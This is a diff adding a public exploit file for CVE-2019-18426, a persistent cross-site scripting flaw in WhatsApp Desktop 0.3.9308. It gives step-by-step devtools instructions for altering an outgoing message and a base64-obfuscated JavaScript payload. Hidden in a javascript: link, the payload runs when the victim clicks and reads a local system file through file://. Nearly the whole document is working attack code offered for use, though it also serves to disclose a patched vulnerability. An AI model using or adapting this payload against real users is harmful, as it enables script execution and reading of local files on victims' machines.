@@ -1,0 +1,42 @@
+# Title: WhatsApp Desktop 0.3.9308 - Persistent Cross-Site Scripting
+# Date: 2020-01-21
+# Exploit Author: Gal Weizman
+# Vendor Homepage: https://www.whatsapp.com
+# Software Link: https://web.whatsapp.com/desktop/windows/release/x64/WhatsAppSetup.exe
+# Software Link: https://web.whatsapp.com/desktop/mac/files/WhatsApp.dmg
+# Version: 0.3.9308
+# Tested On: Mac OS, Windows, iPhone
+# CVE: https://nvd.nist.gov/vuln/detail/CVE-2019-18426
+
+// step 1: open WhatsApp Web and enter a conversation (Will only work on WhatsApp Web source code as compiled with version 0.3.9308)
+// step 2: open devtools and search in all files "t=e.id"
+// step 3: after prettifying, set a breakpoint at the line where "t = e.id" can be found
+// step 4: paste "https://example.com" in the text box and hit "Enter"
+// step 5: when the code stops at the breakpoint, paste the following exploit code in the console and hit "Enter"
+
+var payload = `(async function() {
+    alert(navigator.userAgent);
+    (async function() {
+	    // read "file:///C:/windows/system32/drivers/etc/hosts" content
+	    const r = await fetch(atob('ZmlsZTovLy9DOi93aW5kb3dzL3N5c3RlbTMyL2RyaXZlcnMvZXRjL2hvc3Rz'));
+        const t = await r.text();
+        alert(t);
+    }())
+}())`;
+
+payload = `javascript:"https://example.com";eval(atob("${btoa(payload)}"))`;
+
+e.__x_matchedText = payload;
+
+e.__x_body = `
+    Innocent text
+
+    ${payload}
+
+    More Innocent text
+`;
+
+// step 6: press F8 in order for the execution to continue
+// result: a message should be sent to the victim that once is clicked will execute the payload above
+
+// further information: https://github.com/weizman/CVE-2019-18426
